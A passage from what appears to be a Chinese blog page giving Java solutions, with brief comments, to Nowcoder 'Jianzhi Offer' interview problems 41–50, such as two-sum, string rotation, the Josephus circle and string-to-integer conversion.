<span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindContinuousSequence(<span class="keyword">int</span> sum) &#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> right = <span class="number">2</span>;</span><br><span class="line">        ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= sum / <span class="number">2</span> &amp;&amp; right &lt;= sum) &#123;</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = left; i &lt;= right; i++) &#123;</span><br><span class="line">                count += i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//right加1，向右扩张</span></span><br><span class="line">            <span class="keyword">if</span> (count &lt; sum) &#123;</span><br><span class="line">                right++;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//left加1，向右收缩</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (count &gt; sum) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = left; i &lt;= right; i++) &#123;</span><br><span class="line">                    list.add(i);</span><br><span class="line">                &#125;</span><br><span class="line">                res.add(list);</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="42-和为S的两个数字"><a href="#42-和为S的两个数字" class="headerlink" title="42.和为S的两个数字"></a>42.和为S的两个数字</h3><h4 id="标签：【数学】【数组】【双指针】"><a href="#标签：【数学】【数组】【双指针】" class="headerlink" title="标签：【数学】【数组】【双指针】"></a>标签：【数学】【数组】【双指针】</h4><h4 id="题目描述-41"><a href="#题目描述-41" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。</p><p>输出描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 对应每个测试案例，输出两个数，小的先输出。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">FindNumbersWithSum</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">if</span> (array == <span class="keyword">null</span> || array.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//双指针</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = array.length - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//乘积</span></span><br><span class="line">        <span class="keyword">int</span> product = Integer.MAX_VALUE;</span><br><span class="line">        <span class="comment">//前后两个指针相遇就停止</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (array[left] + array[right] == sum) &#123;</span><br><span class="line">                <span class="keyword">if</span> (array[left] * array[right] &lt; product) &#123;</span><br><span class="line">                    product = array[left] * array[right];</span><br><span class="line">                    res.add(<span class="number">0</span>, array[left]);</span><br><span class="line">                    res.add(<span class="number">1</span>, array[right]);</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (array[left] + array[right] &gt; sum) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="43-左旋转字符串"><a href="#43-左旋转字符串" class="headerlink" title="43.左旋转字符串"></a>43.左旋转字符串</h3><h4 id="标签：【字符串】-2"><a href="#标签：【字符串】-2" class="headerlink" title="标签：【字符串】"></a>标签：【字符串】</h4><h4 id="题目描述-42"><a href="#题目描述-42" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>汇编语言中有一种移位指令叫做循环左移（ROL），现在有个简单的任务，就是用字符串模拟这个指令的运算结果。对于一个给定的字符序列S，请你把其循环左移K位后的序列输出。例如，字符序列S=”abcXYZdef”,要求输出循环左移3位后的结果，即“XYZdefabc”。是不是很简单？OK，搞定它！</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">LeftRotateString</span><span class="params">(String str, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        LinkedList&lt;Character&gt; list1 = <span class="keyword">new</span> LinkedList&lt;Character&gt;();</span><br><span class="line">        LinkedList&lt;Character&gt; list2 = <span class="keyword">new</span> LinkedList&lt;Character&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; n % str.length()) &#123;</span><br><span class="line">                list1.add(str.charAt(i));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                list2.add(str.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">while</span> (list2.size() != <span class="number">0</span>) &#123;</span><br><span class="line">            sb.append(list2.remove());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (list1.size() != <span class="number">0</span>) &#123;</span><br><span class="line">            sb.append(list1.remove());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="44-翻转单词顺序序列"><a href="#44-翻转单词顺序序列" class="headerlink" title="44.翻转单词顺序序列"></a>44.翻转单词顺序序列</h3><h4 id="标签：【字符串】-3"><a href="#标签：【字符串】-3" class="headerlink" title="标签：【字符串】"></a>标签：【字符串】</h4><h4 id="题目描述-43"><a href="#题目描述-43" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>牛客最近来了一个新员工Fish，每天早晨总是会拿着一本英文杂志，写些句子在本子上。同事Cat对Fish写的内容颇感兴趣，有一天他向Fish借来翻看，但却读不懂它的意思。例如，“student. a am I”。后来才意识到，这家伙原来把句子单词的顺序翻转了，正确的句子应该是“I am a student.”。Cat对一一的翻转这些单词顺序可不在行，你能帮助他么？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">ReverseSentence</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(str==<span class="keyword">null</span> ||str.length()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//String.trim()方法去除字符串前后的空格</span></span><br><span class="line">        <span class="keyword">if</span>(str.trim().equals(<span class="string">""</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//以空格分割字符串</span></span><br><span class="line">        String[] input=str.split(<span class="string">"\\s"</span>);</span><br><span class="line">        StringBuffer sb=<span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=input.length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            sb.append(input[i]).append(<span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String res=sb.toString();</span><br><span class="line">        <span class="comment">//输出字符串，去除最后一个空格</span></span><br><span class="line">        <span class="keyword">return</span> res.substring(<span class="number">0</span>,res.length()-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="45-扑克牌顺子"><a href="#45-扑克牌顺子" class="headerlink" title="45.扑克牌顺子"></a>45.扑克牌顺子</h3><h4 id="标签：【字符串】-4"><a href="#标签：【字符串】-4" class="headerlink" title="标签：【字符串】"></a>标签：【字符串】</h4><h4 id="题目描述-44"><a href="#题目描述-44" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>LL今天心情特别好,因为他去买了一副扑克牌,发现里面居然有2个大王,2个小王(一副牌原本是54张^_^)…他随机从中抽出了5张牌,想测测自己的手气,看看能不能抽到顺子,如果抽到的话,他决定去买体育彩票,嘿嘿！！“红心A,黑桃3,小王,大王,方片5”,“Oh My God!”不是顺子…..LL不高兴了,他想了想,决定大\小 王可以看成任何数字,并且A看作1,J为11,Q为12,K为13。上面的5张牌就可以变成“1,2,3,4,5”(大小王分别看作2和4),“So Lucky!”。LL决定去买体育彩票啦。 现在,要求你使用这幅牌模拟上面的过程,然后告诉我们LL的运气如何， 如果牌能组成顺子就输出true，否则就输出false。为了方便起见,你可以认为大小王是0。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*简单来说就是要是5个数字，最大和最小差值在5以内，并且没有重复数值。用一个set来填充数据，0不要放进去。set的*大小加上0的个数必须为5个。此外set中数值差值在5以内。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isContinuous</span><span class="params">(<span class="keyword">int</span>[] numbers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (numbers.length &lt; <span class="number">5</span> || numbers.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeSet&lt;Integer&gt; set = <span class="keyword">new</span> TreeSet&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numbers.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (numbers[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                set.add(numbers[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num + set.size() != <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (set.last() - set.first() &lt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="46-孩子们的游戏（圆圈中最后剩下的数）"><a href="#46-孩子们的游戏（圆圈中最后剩下的数）" class="headerlink" title="46.孩子们的游戏（圆圈中最后剩下的数）"></a>46.孩子们的游戏（圆圈中最后剩下的数）</h3><h4 id="标签：【链表】【数学】"><a href="#标签：【链表】【数学】" class="headerlink" title="标签：【链表】【数学】"></a>标签：【链表】【数学】</h4><h4 id="题目描述-45"><a href="#题目描述-45" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>每年六一儿童节,牛客都会准备一些小礼物去看望孤儿院的小朋友,今年亦是如此。HF作为牛客的资深元老,自然也准备了一些小游戏。其中,有个游戏是这样的:首先,让小朋友们围成一个大圈。然后,他随机指定一个数m,让编号为0的小朋友开始报数。每次喊到m-1的那个小朋友要出列唱首歌,然后可以在礼品箱中任意的挑选礼物,并且不再回到圈中,从他的下一个小朋友开始,继续0…m-1报数….这样下去….直到剩下最后一个小朋友,可以不用表演,并且拿到牛客名贵的“名侦探柯南”典藏版(名额有限哦!!^_^)。请你试着想下,哪个小朋友会得到这份礼品呢？(注：小朋友的编号是从0到n-1)</p><p>如果没有小朋友，请返回-1</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LastRemaining_Solution</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;Integer&gt; list =<span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            list.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//被提出的小朋友</span></span><br><span class="line">        <span class="keyword">int</span> out=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(list.size()&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">//防止超出列表长度</span></span><br><span class="line">            out=(out+m-<span class="number">1</span>)%list.size();</span><br><span class="line">            <span class="comment">//移除</span></span><br><span class="line">            list.remove(out);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//剩余的最后一个小朋友</span></span><br><span class="line">        <span class="keyword">return</span> list.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="47-求1-2-3-…-n"><a href="#47-求1-2-3-…-n" class="headerlink" title="47.求1+2+3+…+n"></a>47.求1+2+3+…+n</h3><h4 id="标签：【进制转化】【数学】"><a href="#标签：【进制转化】【数学】" class="headerlink" title="标签：【进制转化】【数学】"></a>标签：【进制转化】【数学】</h4><h4 id="题目描述-46"><a href="#题目描述-46" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>求1+2+3+…+n，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Sum_Solution</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = n;</span><br><span class="line">        <span class="comment">//逻辑且的短路原理，当n=0时，不再往下递归</span></span><br><span class="line">        <span class="keyword">boolean</span> temp = (n != <span class="number">0</span>) &amp;&amp; ((sum = sum + Sum_Solution(n - <span class="number">1</span>)) != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="48-不用加减乘除做加法"><a href="#48-不用加减乘除做加法" class="headerlink" title="48.不用加减乘除做加法"></a>48.不用加减乘除做加法</h3><h4 id="标签：【进制转化】【数学】-1"><a href="#标签：【进制转化】【数学】-1" class="headerlink" title="标签：【进制转化】【数学】"></a>标签：【进制转化】【数学】</h4><h4 id="题目描述-47"><a href="#题目描述-47" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>写一个函数，求两个整数之和，要求在函数体内不得使用+、-、*、/四则运算符号。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*  执行加法  x ^ y</span></span><br><span class="line"><span class="comment">*  进位操作 ( x &amp; y ) &lt;&lt; 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> num1,<span class="keyword">int</span> num2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(num2!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//保存进位信息</span></span><br><span class="line">            <span class="keyword">int</span> temp=(num1&amp;num2)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//二进制加</span></span><br><span class="line">            num1=num1^num2;</span><br><span class="line">            <span class="comment">//进位赋予num2，循环执行相加，直到无进位为止</span></span><br><span class="line">            num2=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="49-把字符串转换成整数"><a href="#49-把字符串转换成整数" class="headerlink" title="49.把字符串转换成整数"></a>49.把字符串转换成整数</h3><h4 id="标签：【字符串】【数学】【字符串】"><a href="#标签：【字符串】【数学】【字符串】" class="headerlink" title="标签：【字符串】【数学】【字符串】"></a>标签：【字符串】【数学】【字符串】</h4><h4 id="题目描述-48"><a href="#题目描述-48" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>将一个字符串转换成一个整数，要求不能使用字符串转换整数的库函数。 数值为0或者字符串不是一个合法的数值则返回0</p><p>输入描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入一个字符串,包括数字字母符号,可以为空</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>输出描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 如果是合法的数值表达则返回该数字，否则返回0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>示例1</p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; +2147483647</span><br><span class="line">&gt; 1a33</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2147483647</span><br><span class="line">&gt; 0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">StrToInt</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="keyword">null</span> || str.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//第一个字符</span></span><br><span class="line">        <span class="keyword">char</span> first = str.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//整数转化开始下标</span></span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//符号标记，正数为0，负数为1</span></span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (first == <span class="string">'+'</span>) &#123;</span><br><span class="line">            start = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (first == <span class="string">'-'</span>) &#123;</span><br><span class="line">            start = <span class="number">1</span>;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (first &lt; <span class="string">'0'</span> || first &gt; <span class="string">'9'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str.charAt(i) &gt;= <span class="string">'0'</span> &amp;&amp; str.charAt(i) &lt;= <span class="string">'9'</span>) &#123;</span><br><span class="line">                res = res * <span class="number">10</span> + str.charAt(i) - <span class="string">'0'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//正整数溢出</span></span><br><span class="line">            <span class="keyword">if</span> (res &gt; Integer.MAX_VALUE) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//负整数溢出</span></span><br><span class="line">            <span class="keyword">if</span> ((-<span class="number">1</span>) * res &lt; Integer.MIN_VALUE) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res = (<span class="keyword">int</span>) (-<span class="number">1</span> * res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="50-数组中重复的数字"><a href="#50-数组中重复的数字" class="headerlink" title="50.数组中重复的数字"></a>50.数组中重复的数字</h3><h4 id="标签：【数组】-8"><a href="#标签：【数组】-8" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-49"><a href="#题目描述-49" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>在一个长度为n的数组里的所有数字都在0到n-1的范围内。 数组中某些数字是重复的，但不知道有几个数字是重复的。也不知道每个数字重复几次。请找出数组中任意一个重复的数字。 例如，如果输入长度为7的数组{2,3,1,0,2,5,3}，那么对应的输出是第一个重复的数字2。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">duplicate</span><span class="params">(<span class="keyword">int</span> numbers[], <span class="keyword">int</span> length, <span class="keyword">int</span>[] duplication)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (numbers == <span class="keyword">null</span> || length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HashMap&lt;Integer, Boolean&gt; map = <span class="keyword">new</span> 